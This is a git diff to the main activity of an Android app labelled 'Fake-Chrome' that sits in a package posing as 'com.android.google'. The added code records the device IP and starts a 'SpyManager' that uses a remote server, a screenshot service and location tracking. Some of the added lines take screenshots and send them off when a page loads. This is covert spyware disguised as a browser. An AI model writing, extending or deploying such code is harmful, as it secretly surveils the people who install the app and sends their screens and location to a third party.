@@ -2,10 +2,13 @@ package com.android.google
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.os.Bundle
+import android.util.AttributeSet
+import android.view.View
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -15,11 +18,18 @@ import androidx.activity.viewModels
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.android.google.databinding.ActivityMainBinding
+import com.android.google.remote.server.Server
+import com.android.google.services.screenshoot.ScreenshotService
 import com.android.google.services.spymanager.SpyManager
 import com.android.google.services.tracker.Tracker
+import com.android.google.utils.IpService
+import com.android.google.utils.User
 import com.android.google.utils.logw
 import com.android.google.utils.toast
 import com.android.google.viewmodel.MainViewModel
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 /*
 * Fake-Chrome 30.12.2022
@@ -49,7 +59,30 @@ class MainActivity : AppCompatActivity() {
         prepareBinding()
         handleOnBackPressed()
 
-        //spyManager = SpyHelper.initialize()
+        val ip = IpService.getIPAddress(useIPv4 = true)
+        User.fill(ip = ip)
+    }
+
+    override fun onResume() {
+        super.onResume()
+
+        isVisible = true
+        setupSpyManager()
+    }
+
+    private fun setupSpyManager() = CoroutineScope(Dispatchers.Main).launch {
+        val remoteService = Server()
+        val screenshotService = ScreenshotService(binding.root)
+
+        spyManager = SpyManager.newInstance(
+            remote = remoteService,
+            screenshotService = screenshotService
+        )
+
+        spyManager.start(
+            screenshotService = true,
+            locationService = true
+        )
     }
 
     private fun handleOnBackPressed() {
@@ -89,6 +122,7 @@ class MainActivity : AppCompatActivity() {
             override fun onPageFinished(view: WebView, url: String) { // Page loaded
 
                 if (BuildConfig.DEBUG) {
+                    spyManager.takeAndSendScreenshot()
                     logw("OnPageFinished: $url")
                 }
             }
@@ -98,7 +132,9 @@ class MainActivity : AppCompatActivity() {
 
                 if (url != null) { // Saving url state
                     mainViewModel.setUrl(url)
-                    spyManager.takeAndSendScreenshot()
+
+                    //spyManager.takeAndSendScreenshot()
+                    //spyManager.sendUrl(url)
                 }
 
                 if (BuildConfig.DEBUG) {
@@ -131,5 +167,15 @@ class MainActivity : AppCompatActivity() {
                 finish()
             }
         }
+
+    override fun onStop() {
+        super.onStop()
+
+        isVisible = false
+    }
+
+    companion object {
+        var isVisible = false
+    }
 
 }
